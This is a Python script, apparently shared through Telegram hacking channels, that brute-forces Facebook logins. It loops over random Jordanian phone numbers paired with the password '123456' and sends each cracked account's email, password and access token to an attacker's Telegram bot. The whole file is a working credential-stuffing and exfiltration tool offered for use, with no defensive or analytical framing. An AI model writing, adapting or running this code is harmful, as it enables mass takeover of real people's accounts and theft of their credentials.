# encoding: utf-8
# Decoded by HackerMode tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @gg4rt )
import requests, sys, time, os, random, colorama
from time import sleep
E = '\x1b[1;34m'
G = '\x1b[1;35m'
S = '\x1b[1;33m'
print('''
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 قناتي        @switchcoin1
      يوزري       @ashraf1240
            ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
مننوع تغير حقوق الاده       
      ━━━━━━━━━                
                                ''')
token = input('اڪتب تكوين البوت 🖤🌼ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ ')
ID = input('ايدي حسابك   💟💞 ')
user = '1234567890'

def Abs(email, password):
    url = 'https://api.facebook.com/method/auth.login'
    headers = {
    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
    'Accept-Language' : 'en-US,en;q=0.5'
    }
    data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }

    req = requests.post(url, headers=headers, data=data)
    id = str(req.json()['uid'])
    con = str(req.json()['identifier'])
    tkn = str(req.json()['access_token'])
    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𝓜𝓡_𝓐𝓜𝓡 𖢕 صد لك حساب \n. — — — — —  — — — — — .\n ⌯ ID : {id} ♡. \n ⌯ Email : {email} ♡. \n ⌯ Password : {password} ♡. \n ⌯ Confirmed Email : {con}\n.⌯ Access Token : {tkn} \n. — — — — —  — — — — — .\n• @switchcoin1 قناتي  : l .  \n• حسابي :@ashraf1240X "
    i = requests.post(tlg)
    print(f"{G}⌯ Email : {email} \n ⌯ Password ==> {password}")


while True:
    abs = str(''.join((random.choice(user) for i in range(7))))
    email = '+96279' + abs
    password = '123456' 
    if email == '':
           exit()
           if password == '1122334455':
              exit()
    url = 'https://api.facebook.com/method/auth.login'
    headers = {
    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
    'Accept-Language' : 'en-US,en;q=0.5'
    }
    data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }

    req = requests.post(url, headers=headers, data=data)
    if 'access_token' in req.json():
        Abs(email, password)
        print(f"{S}CheckPoint {email}:{password}")
    else:
        print(f"{E}⌯ Email : {email} ⌯ Password : {password}")
